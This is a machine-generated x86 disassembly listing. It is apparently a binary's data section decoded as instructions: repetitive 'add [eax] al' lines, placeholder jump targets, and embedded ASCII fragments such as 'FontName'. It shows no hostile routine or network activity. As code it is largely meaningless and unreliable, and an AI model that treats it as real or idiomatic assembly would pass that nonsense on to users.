add [ eax ] al
add bh ch
mov [ eax + eax + 0x5c ] al
add [ eax ] al
add [ ecx + edi * 2 ] ah
inc esp
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ecx + edx * 8 ] ah
inc esp
add [ ebx + edx + 0x13a40043 ] bl
inc ebx
add ah cl
adc al [ ebx ]
mov ah 0xda
inc esp
add ah bh
fiadd [ eax + eax + 0x40 ]
fiadd [ eax + eax - 0x78 ]
fiadd [ eax + eax + 0x68 ]
fiadd [ eax + eax - 0x4c ]
fiadd [ eax + eax - 0xc ]
into
inc esp
add [ eax ] cl
iretd
sub_44870e
inc esp
add [ eax ] al
loopne r-xdata
add al bl
fld [ eax + eax + 0x20 ]
fiadd [ eax + eax + 0x28 ]
fiadd [ eax + eax + 0x78 ]
fiadd [ eax + eax + 0x6c ]
fld [ eax + eax - 0x20 ]
fiadd [ eax + eax - 0x44 ]
fadd [ eax + eax - 0x38 ]
fild [ eax + eax - 0x58 ]
fild [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
and al 0xaf
inc eax
add [ eax ] bh
add [ eax ] al
add [ edi ] al
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ edi + esi * 2 + 0x3c0044 ] ah
add [ eax ] al
add eax 0x74617453
add al [ gs : eax ]
add [ ecx + esi * 2 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add eax 0x6e6f4646
je r-xdata
add [ ecx + edx * 8 - 0x2e23ffbc ] al
inc esp
add [ eax - 0x7fffbb2c ] ah
aad 0x44
add [ esi + edx * 8 ] ch
inc esp
add al ah
salc
inc esp
add [ edi + edx * 8 ] dl
inc esp
add [ edi + edx * 8 + 0x44 ] bl
add [ eax - 0x17ffbb29 ] bl
xlat
inc esp
add [ eax + ebx * 8 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] ah
add [ eax - 0x17ffbb28 ] dl
fadd [ eax + eax + 0x24 ]
fld [ eax + eax + 0x60 ]
fld [ eax + eax - 0x64 ]
fld [ eax + eax - 0x28 ]
dec esp
je r-xdata
add [ eax ] al
add al [ eax ]
add [ eax + eax ] al
add [ esi + eax * 2 ] al
push eax
outsb
add al [ eax ]
add [ esi + esi * 2 + 0x44 ] al
add [ eax ] cl
add [ eax ] al
push es
inc esi
inc edx
jb r-xdata
add [ ecx ] dl
add dl ch
mov eax [ eax + eax + 0x4a ]
add [ edx ] dl
add [ ecx - 0x74 ] al
inc esp
add [ edx ] cl
adc eax [ eax ]
ja r-xdata
jae r-xdata
add [ eax ] al
inc esp
add [ edx ] cl
adc al 0x0
fmul [ esp + eax * 2 + 0x15004a00 ]
add [ edi ] cl
lea eax [ eax + eax + 0x42 ]
add ah dh
inc esp
add [ edx ] cl
adc [ eax ] al
scasd [ edi ]
mov eax [ eax + eax + 0x4a ]
add al [ eax ]
add [ eax + 0x4c0040a8 ] al
add [ eax ] al
add [ edi ] al
inc esi
push eax
outsb
push eax
outsd
jae r-xdata
add [ eax ] al
sbb eax 0x4488f700
add [ eax + eax - 0xc ] al
[ 0x4d004489 ]
add bh bh
inc [ ecx + ecx * 4 + 0x44 ]
add [ edx ] cl
or al 0x0
dec ebp
outsd
add al [ gs : eax ]
pushfd
adc [ eax ] al
push esp
add [ eax ] al
add [ ecx ] cl
inc esi
inc ebx
outsd
jo r-xdata
sub_448877
lea eax [ eax + eax + 0x4a ]
add [ esi ] dl
add [ edx - 0x73 ] bh
inc esp
add [ edx ] cl
pop ss
add [ esi + 0x4a00448d ] dh
add [ eax ] bl
add [ ecx ] bh
mov es [ eax + eax + 0x4a ]
add [ ecx ] bl
add [ edi - 0x72 ] al
inc esp
add [ edx ] cl
sbb al [ eax ]
push esi
mov es [ eax + eax + 0x4a ]
add [ ebx ] bl
add [ edi - 0x72 ] ah
inc esp
add [ edx ] cl
sbb al 0x0
jpe r-xdata
push ebx
mov eax [ eax + eax + 0x4a ]
add [ eax ] dl
add [ edi + 0x4a00448b ] ch
add [ ecx ] dl
add dl ch
mov eax [ eax + eax + 0x4a ]
add [ edx ] dl
add [ ecx - 0x74 ] al
inc esp
add [ edx ] cl
adc eax [ eax ]
ja r-xdata
inc esp
add [ edx ] cl
sbb eax 0x448ed300
add [ edx ] cl
push ds
add dl bh
mov es [ eax + eax + 0x4a ]
add [ edi ] bl
add [ ebx - 0x71 ] ch
inc esp
add [ edx ] cl
and [ eax ] al
mov ch 0x8f
inc esp
add [ edx ] cl
and [ eax ] eax
clc
pop [ eax + eax + 0x4a ]
add [ edx ] ah
add [ ebx - 0x70 ] al
inc esp
add [ edx ] cl
and eax [ eax ]
fwait
nop
inc esp
add [ edx ] cl
and al 0x0
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
pushfd
adc [ eax ] al
push esp
add [ eax ] al
add [ ecx ] cl
inc esi
inc ebx
outsd
jo r-xdata
inc esp
add [ edx ] cl
adc al 0x0
fmul [ esp + eax * 2 + 0x15004a00 ]
add [ edi ] cl
lea eax [ eax + eax + 0x42 ]
add ah dh
add al bh
jae r-xdata
dec ebp
outsd
add al [ gs : eax ]
add [ eax ] al
sbb eax 0x4488f700
add [ eax + eax - 0xc ] al
[ 0x4d004489 ]
add bh bh
inc [ ecx + ecx * 4 + 0x44 ]
add [ edx ] cl
or al 0x0
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
jae r-xdata
add [ ecx + edx * 8 ] ah
inc esp
add [ edi ] al
inc esp
jae r-xdata
add [ eax - 0x30 ] ah
inc esp
add [ esi ] al
inc ebx
jb r-xdata
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ eax ] al
pushfd
xchg edi eax
inc esp
add [ eax ] cl
add [ edi ] al
inc edi
jb r-xdata
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ esp + eax * 2 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
and [ eax ] al
or [ eax ] eax
clc
nop
inc esp
inc ebx
outsd
jo r-xdata
add bl [ eax + 0x33 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add bl [ ecx + 0x33 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
jb r-xdata
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
pushfd
adc [ eax ] al
add [ eax ] eax
popad
je r-xdata
add [ edx ] al
jo r-xdata
add [ esp + eax * 2 ] al
jb r-xdata
add al [ eax ]
add al bh
nop
inc esp
add [ edx ] al
add [ esi ] al
inc ebx
popad
outsb
jbe r-xdata
add [ eax + edx + 0x10040 ] bl
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x180040 ] bl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x4490f800
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ esp + eax * 2 ] al
jae r-xdata
add [ eax + eax ] dl
jns r-xdata
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x180040 ] bl
add bl [ ecx + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
add [ ecx ] al
add [ edx ] al
pop eax
xor [ edx ] eax
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
or [ edi + 0x44 ] dh
add [ eax ] cl
add [ ecx ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x53 ] 0x656c7974
add al [ eax ]
add al [ eax ]
aaa
add al ch
xlat
inc esp
add [ ecx ] cl
inc esi
jb r-xdata
add [ eax ] al
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
or eax 0x77617244
imul esp [ ebx + 0x2 ] 0x5c000200
jae r-xdata
ja r-xdata
add [ esi + edx * 8 ] ch
inc esp
jae r-xdata
add bl [ ecx + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
add bl [ eax + 0x33 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add bl [ ecx + 0x33 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
add bl [ eax + 0x34 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
add bl [ ecx + 0x34 ]
add al [ eax ]
add al [ eax ]
push esi
add al bh
aam 0x44
add [ eax ] cl
inc ebx
outsd
jo r-xdata
add [ edx ] al
pop eax
xor al [ edx ]
add [ eax ] al
pushfd
adc [ eax ] al
sbb [ eax ] al
add al [ eax ]
add [ eax - 0x5d ] bh
inc esp
add [ edx ] al
add [ esi ] al
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x1000270
int3
add [ eax ] al
or [ eax ] al
add [ eax ] eax
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add [ eax ] 0xffffff84
rol [ eax + eax + 0x3 ] 0x1
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add al bh
add [ esi ] al
dec esp
imul ebp [ esi + 0x65 ] 0x36f54
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ edx ] al
add [ eax + eax ] bh
fadd [ fs : eax + eax + 0x6 ]
dec ebp
outsd
jbe r-xdata
insd
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
das
add [ eax + ebx * 8 ] ah
inc esp
add [ edi ] cl
dec eax
popad
outsb
insb
inc ecx
insb
insb
outsd
arpl [ ecx + 0x74 ] sp
add eax [ fs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add al bh
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
cmp al 0x0
sub al 0xd8
inc esp
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
add bl [ ecx + 0x32 ]
add al [ eax ]
add al [ eax ]
add [ ss : edi + edx * 8 + 0x44 ] bl
add [ eax ] cl
inc esi
imul ebp [ esp + ebp * 2 + 0x52 ] 0x3746365
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add al bh
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
popad
add [ eax + 0x90044d7 ] bl
inc esi
insb
outsd
outsd
inc esi
imul ebp [ esp + ebp * 2 + 0x3 ] 0x0
add [ eax ] dl
add [ 0x4490f800 ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ eax ] al
pop eax
inc esp
add [ eax + eax ] cl
add eax 0x6f6c6f43
jb r-xdata
inc eax
add [ ecx ] al
add [ edx ] al
pop eax
xor [ edx ] eax
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
push edi
add [ edi + edx * 8 ] dl
inc esp
add [ edi ] al
inc ebp
insb
insb
imul esi [ eax + 0x73 ] 0x365
add [ eax ] al
add [ eax ] dl
add [ 0x4490f800 ] al
add [ eax ] al
adc [ eax ] al
add eax 0x4490f800
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ eax ] al
pushfd
xchg edi eax
inc esp
add [ eax + eax ] cl
pop es
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ 0x4490f800 ] al
int3
add [ ecx ] al
add bl [ eax + 0x34 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
add bl [ ecx + 0x34 ]
add al [ eax ]
add al [ eax ]
add ah bl
rol [ eax + eax + 0x9 ] 0x1
inc edx
jb r-xdata
add [ eax + eax ] cl
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
and [ eax ] al
or [ eax ] eax
clc
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x1c0040 ] bl
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x180040 ] bl
add bl [ ecx + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
add bl [ eax + 0x33 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add bl [ ecx + 0x33 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
add bl [ eax + 0x34 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
add bl [ ecx + 0x34 ]
add al [ eax ]
add al [ eax ]
push cs
add al ch
fadd [ eax + eax + 0x7 ]
push eax
outsd
insb
jns r-xdata
push esp
outsd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ edx ] al
add [ ebx + 0x44d89000 ] al
add [ ebx ] al
push eax
imul esp [ ebp + 0x3 ] 0x0
add [ eax ] ah
add [ ecx ] cl
add al bh
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
jo r-xdata
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
outsd
outsb
verr [ ecx + ebx * 8 ]
inc esp
add [ eax ] cl
push eax
outsd
insb
jns r-xdata
add eax 0x4490f800
imul esp [ ebx + 0x2 ] 0x10b40000
inc eax
add [ eax ] cl
add [ edi ] al
dec edi
jo r-xdata
add [ eax ] al
pushfd
adc [ eax ] al
adc [ eax ] al
jae r-xdata
add bl [ ecx + 0x32 ]
add al [ eax ]
add al [ eax ]
daa
add [ edx ] al
pop eax
xor al [ edx ]
add [ eax ] al
pushfd
adc [ eax ] al
or [ eax ] al
imul ebp [ esi + 0x65 ] 0xd9600011
inc esp
add [ edx ] cl
push eax
outsd
insb
jns r-xdata
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add al 0x53
arpl [ ecx + 0x74 ] bp
jns r-xdata
js r-xdata
je r-xdata
add bl [ eax + 0x33 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
add bl [ ecx + 0x33 ]
add al [ eax ]
add al [ eax ]
dec edx
add [ eax - 0x26 ] bh
inc esp
add [ ebx ] cl
push ebx
add [ eax ] dl
add [ edx ] al
pop ecx
xor al [ edx ]
add [ eax ] al
pushfd
adc [ eax ] al
or al 0x0
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
jno r-xdata
inc eax
add [ ecx ] al
add [ edx ] al
pop eax
xor [ edx ] eax
jpe r-xdata
add [ ebx ] bh
add al ah
salc
inc esp
add [ 0x77617244 ] cl
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add al [ eax ]
inc eax
push esp
test eax 0x20040
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
dec ebx
add al ah
fiadd [ eax + eax + 0x7 ]
push esp
js r-xdata
add al [ eax ]
push 0x77617244
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add esp ecx
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add [ edi + edx * 4 + 0x20044 ] bl
pop es
inc edi
jb r-xdata
sub dl bl
inc esp
add [ ecx ] cl
push edx
outsd
jne r-xdata
add [ eax ] ah
fiadd [ eax + eax + 0x7 ]
push edx
jb r-xdata
xor al [ edx ]
add [ edx ] al
add [ edi ] ah
jb r-xdata
add ah bh
add al [ eax ]
add [ ecx + edi * 2 ] cl
inc esp
add [ eax ] cl
add [ edx ] cl
push esp
js r-xdata
add [ eax + 0x12 ] eax
dec edi
jne r-xdata
add al 0x0
clc
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
jo r-xdata
je r-xdata
add bl [ ecx + 0x32 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
sbb [ eax ] al
pop es
add al bh
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x140040 ] bl
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x100040 ] bl
add bl [ ecx + 0x31 ]
add al [ eax ]
add [ eax + edx + 0xc0040 ] bl
add al bl
fld [ eax + eax + 0x9 ]
push edx
arpl [ gs : ecx + 0x6e ] si
insb
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x4490f800
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add bl [ eax + 0x31 ]
add al [ eax ]
add [ eax + edx + 0x20040 ] bl
add [ ecx + ebx * 8 + 0x500c0044 ] bl
outsd
insb
jns r-xdata
sbb dh bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
in al 0x86
inc esp
add [ esp + eax * 4 + 0x44 ] ah
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
inc esi
outsd
jb r-xdata
inc eax
add [ edx ] al
add [ esp + edx * 2 ] al
js r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add al bh
nop
inc esp
add al [ eax ]
add al [ eax ]
pop eax
add [ esp + ebx * 8 + 0x54080044 ] bh
js r-xdata
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
add [ ecx + 0x2 ] ebx
add [ eax ] al
push ebx
imul esp [ ebx + 0x2 ] 0x43000200
add [ ebp + ebx * 8 + 0x44 ] ch
add [ edx ] cl
push esp
js r-xdata
add bl [ eax + 0x32 ]
add al [ eax ]
add [ eax + edx + 0x80040 ] bl
pop ecx
xor [ edx ] eax
add [ eax ] al
pushfd
adc [ eax ] al
or al 0x0
jpe r-xdata
lodsb [ esi ]
fild [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
je r-xdata
or [ eax ] al
add al 0x54
js r-xdata
xchg [ eax + eax + 0x64 ] al
test [ eax + eax + 0x4 ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0x76440004
inc esp
add [ eax ] cl
add bh bh
xor al 0xde
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
jbe r-xdata
popad
je r-xdata
nop
inc esp
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
cld
int3
push edx
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
clc
inc eax
adc al [ eax ]
or [ eax ] al
add al 0x54
inc ebp
js r-xdata
jb r-xdata
push cs
jb r-xdata
inc eax
add [ edi + ebx * 8 ] ah
inc esp
add [ edi + ebx * 8 + 0x10044 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax + eax ] al
[ eax ]
outsd
outsb
je r-xdata
add [ edx ] 0x0
add al 0x46
jo r-xdata
inc esp
add [ edx ] al
add [ ebx ] al
pop ebp
xchg ecx eax
inc esp
add [ edx ] al
add [ ebx ] al
jl r-xdata
jae r-xdata
add [ edx ] bl
enter 0x44db 0x0
or [ ebp + 0x78 ] dl
je r-xdata
add [ edx ] al
js r-xdata
add [ eax ] cl
add [ esp + edx * 2 ] al
outsb
je r-xdata
pop ecx
outsd
pop ecx
push es
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
jae r-xdata
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
inc esp
add [ edx ] al
add [ edx ] al
add [ edi + ebp * 4 ] ah
add [ ebx ] al
sbb dl [ ecx + 0x20044 ]
add edi [ edx ]
xchg ecx eax
pushfd
adc [ eax ] al
push esp
add [ eax ] al
call [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] 0x0
int3
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add [ eax + edx + 0x20040 ] bl
add [ eax + 0x2 ] ebx
add [ eax ] al
pushfd
adc [ eax ] al
or al 0x0
add [ ecx + 0x2 ] ebx
add [ eax ] al
inc eax
adc al [ eax ]
arpl [ gs : ebx + eax ] si
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x4490f800
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esp + edx * 2 ] al
js r-xdata
inc eax
add [ eax ] cl
add [ ebx ] al
add al bh
nop
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + ebp * 4 + 0x40 ] dl
in al 0x91
add [ eax ] al
push ebx
outsb
add [ esi ] al
jae r-xdata
jae r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4806ffff ] al
popad
outsb
insb
mov eax eax
call 0x344d67a
push cs
push esp
push eax
jb r-xdata
dec ebp
outsd
cmp al 0x71
inc esp
add [ eax ] al
add bh bh
inc esp
outsb
je r-xdata
inc esp
add [ 0x67617453 ] al
add al [ gs : eax ]
add [ eax + edx + 0x500b0040 ] dh
add ah ah
xchg ecx eax
push ebx
inc eax
je r-xdata
push cs
add eax 0x67617453
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
xchg ecx eax
inc esp
add [ edx ] cl
jo r-xdata
add [ edx ] cl
push ss
add [ ecx ] cl
xchg esi eax
inc esp
add dl cl
add [ edi ] dl
add [ edi - 0x6a ] al
inc esp
add dl cl
add [ eax ] bl
add [ ebx - 0x35ffbb6a ] al
add [ ecx ] bl
jb r-xdata
and al 0xc3
add [ esp + 0x4 ] 0xffffffdc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
outsd
outsb
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
or [ edx + 0x65 ] edx
jb r-xdata
add [ eax ] al
sbb al 0x40
add [ esi ] al
push es
add [ gs : bp + di ] cl
jns r-xdata
push ebx
je r-xdata
inc esp
add [ esp + ecx * 2 ] cl
outsd
popad
inc esi
jo r-xdata
dec edx
jae r-xdata
inc esp
add [ ebx - 0x6d ] dl
inc esp
add [ ecx ] ah
xchg ebx eax
inc esp
add [ esi ] ch
xchg ebx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
frstor [ eax - 0x6d ]
ja r-xdata
jb r-xdata
outsb
je r-xdata
add [ gs : ecx ] cl
push edx
push eax
jb r-xdata
add [ ebx ] cl
jb r-xdata
cdq
inc esp
add [ esi ] cl
insd
inc esi
imul ebp [ ebp + 0x3 ] 0x0
outsd
imul esp [ ebx + 0x26 ] 0x44f47000
add [ esi ] al
inc ebx
jb r-xdata
0x1700
add al [ eax ]
add [ eax ] al
adc [ eax ] al
and [ eax ] al
add [ eax ] al
or [ esi + 0x4d ] eax
outsd
imul esp [ fs : esi + 0x69 ] 0x26465
add [ eax ] al
adc [ eax ] al
and [ eax ] eax
add [ eax ] al
or al 0x46
push esp
jb r-xdata
and al 0x4
fsub st1
push edi
cmp esi 0xccccccff
cmp edx [ ebx - 0x6cb6ffbc ]
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ ebp + 0x2000000 ] dl
outsd
outsb
add al 0x42
jb r-xdata
add [ eax ] al
mov ah 0x10
inc eax
add [ ebx ] cl
push eax
ja r-xdata
jb r-xdata
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
cdq
inc esp
add [ edi ] dl
insd
push ebx
je r-xdata
add [ eax ] cl
add [ edx ] al
add [ edi + edx * 4 + 0x44 ] bl
add al 0x53
add [ eax ] al
popad
je r-xdata
add ah ch
xchg esi eax
inc esp
add dl cl
add [ edx ] bl
add [ ebx - 0x69 ] dl
outsb
jae r-xdata
int3
add [ ecx ] al
outsd
ja r-xdata
popad
outsb
imul ebp [ esi + 0x67 ] 0x45737008
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
jb r-xdata
insd
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
inc esi
outsd
jb r-xdata
inc esi
jb r-xdata
popad
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ esi + eax * 4 ] ch
inc edx
add [ ecx ] al
add [ esi ] al
push ebx
je r-xdata
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
imul ebp [ ebp + 0x6e ] 0x2656d61
add [ edx ] al
add [ eax + eax ] bh
or [ eax ] al
add al [ eax ]
pushfd
xchg edi eax
inc esp
add [ eax ] al
add [ ebx + edx * 2 ] al
add eax [ eax ]
call [ edi + esi * 8 + 0x44 ]
add [ eax ] cl
push esp
inc edi
jb r-xdata
add ch bh
popad
jb r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
imul esp [ ebx + 0x73 ] 0xc08b0002
xor al 0x92
inc esp
add [ eax ] cl
push cs
push esp
push eax
jb r-xdata
add [ eax ] cl
add [ ebx ] al
add [ edi + edx * 4 + 0x44 ] bl
add al 0x53
inc esi
outsd
jb r-xdata
add [ eax ] al
or al 0x0
popad
je r-xdata
push ebx
popad
insd
add al [ eax ]
add al [ eax ]
cmp al 0x0
mov [ ecx + 0x530c0044 ] bl
popad
jbe r-xdata
dec esp
outsd
popad
inc esi
jb r-xdata
imul ebp [ ebp + 0x3 ] 0x0
add [ eax ] cl
add [ edx ] al
add [ edi + edx * 4 + 0x44 ] bl
add al 0x53
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ eax ] cl
inc esi
